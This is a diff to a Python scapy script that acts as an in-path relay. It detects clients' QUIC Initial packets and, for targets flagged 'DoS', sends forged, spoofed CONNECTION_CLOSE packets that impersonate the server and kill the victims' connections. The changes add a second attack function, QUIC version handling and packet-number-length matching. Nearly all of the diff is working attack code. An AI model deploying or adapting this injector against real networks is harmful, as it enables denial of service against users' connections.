@@ -7,15 +7,48 @@ load_contrib("quic")
 from scapy.layers.quic import *
 from connection_close import QUIC_CONNECTION_CLOSE
 bind_bottom_up(UDP, QUIC, dport=443)
-bind_bottom_up(UDP, QUIC, sport=443)
 bind_layers(UDP, QUIC, dport=443, sport=443)
+
 from forge import forge_cc_scapy
 import threading, sys, os
 from victims import Victims
+from quic_protected import *
 
 
 
 
+
+def send_attack2(victim, ver = "V2"):
+    cc = QUIC_CONNECTION_CLOSE(type=0x1C, error_code=0x10,
+                                     frame_type=0, reason_phrase=b"oops!")
+    header = QUIC_InitialProtected(
+        LongPacketType = LONG_HEADER_TYPES["Initial"][ver],
+        PacketNumberLen=4,
+        Version        = VERSION_CONSTANTS["int"][ver],                     
+        DstConnID           = victim[QUIC_Initial].SrcConnID,
+        SrcConnID           = victim[QUIC_Initial].DstConnID,
+        TokenLen = 0,                        
+        Token          = b"",
+        PacketNumber  = 0                    
+    )
+    #
+    #header.show2()
+    forged = (
+        IP(src=victim[IP].dst, dst=victim[IP].src) /
+        UDP(sport=victim[UDP].dport, dport=victim[UDP].sport) /
+        header / cc
+    )
+    #header.show2()
+    bytes(forged)
+    #print(f"Repr of QUIC_InitialProtected: {repr(bytes(header))}")
+    #header.show2()
+    #print(forged.summary())
+    h = (header/cc)[QUIC_Initial]
+    assert h.Reserved == 0,         "Reserved bits must be 0"
+    assert h.TokenLen == 0,         "Server Initial must have TokenLen = 0"
+    assert h.Length   > 0,          "Length field cannot be zero"
+    wrpcap("forged.pcap", forged)
+    #send(forged, iface=inner_iface, verbose=False)
 
 def add_and_send_to_server(pkt):
     new_pkt = pkt[IP]
@@ -26,7 +59,7 @@ def add_and_send_to_server(pkt):
     send(new_pkt, iface=outer_iface, verbose=False)
 
 
-def send_attack(victim):
+def send_attack(victim, PacketNumberLen):
     # build a CONNECTION_CLOSE frame
     cc = QUIC_CONNECTION_CLOSE(
         type          = 0x1C,
@@ -42,7 +75,13 @@ def send_attack(victim):
         dcid_secret = dcid_for_keys,
         dcid_header = dcid_in_header,
         tpl = tpl,
-        frame = frame)
+        frame = frame, PacketNumberLen=PacketNumberLen, ver="V2") # "V1" for version 1, "V2" for version 2.
+    #forged.show()
+    #QUIC(bytes(forged)).show()
+    """raw = forged
+    ip = IP(raw)
+    udp = ip[UDP]
+    QUIC(udp.payload.load).show()"""
     send(forged, iface=inner_iface, verbose=False)
 
 def handle_quic(pkt):
@@ -51,9 +90,12 @@ def handle_quic(pkt):
     if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_iface) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_iface):
         if pkt.sniffed_on == inner_iface:
             vs.update(pkt)
-            if QUIC_Initial in pkt and (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
-                send_attack(pkt)
-                return
+            if QUIC_Initial in pkt:
+                #print(f"CLHO PacketLength: {bin(pkt[QUIC_Initial].PacketNumberLen)}")
+                if (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
+                    #send_attack2(pkt,ver="V1")
+                    send_attack(pkt, PacketNumberLen = pkt[QUIC_Initial].PacketNumberLen)
+                    return
                 
             add_and_send_to_server(pkt)
             
